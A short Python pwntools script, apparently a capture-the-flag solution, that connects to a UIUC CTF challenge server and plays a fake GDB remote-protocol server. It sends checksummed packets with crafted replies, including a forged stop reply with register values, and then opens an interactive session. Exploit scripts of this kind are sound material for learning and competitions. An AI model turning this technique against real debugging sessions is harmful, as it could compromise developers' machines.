from pwn import *
context.log_level='debug'
def make(x):
    checksum = sum([ord(h) for h in x]) & 0xff
    pk = '$%s#%s' % (x, '0' * (2 - len(hex(checksum)[2:])) + hex(checksum)[2:])
    return pk

s = remote('chal.uiuc.tf', 2002)

print(s.recv()) # +$qSupported:multiprocess+;xmlRegisters=i386;qRelocInsn+#b5

s.send('+')
s.send(make('multiprocess+;xmlRegisters=i386;qRelocInsn+'))

print(s.recv()) # $Hgp0.0#ad

s.send('+')
s.send(make('OK'))

print(s.recv()) # $Hgp0.0#ad
s.send('+')
s.send(make('Trunning;tnotrun:0'))

print(s.recv()) # $Hgp0.0#ad
s.send('+')
s.send(make('1:0:1:74726163655f74696d657374616d70'))

print(s.recv()) # $Hgp0.0#ad
s.send('+')
s.send(make('l'))

print(s.recv()) # $Hgp0.0#ad
s.send('+')
s.send(make('T0506:0*,;07:60e6f*"7f0* ;10:0001fdf7ff7f0* ;thread:p886f.886f;core:0;'))

print(s.recv()) # $Hgp0.0#ad
s.send('+')
s.send(make('OK'))

print(s.recv()) # $Hgp0.0#ad
s.send('+')
s.send(make('E10'))


s.interactive()
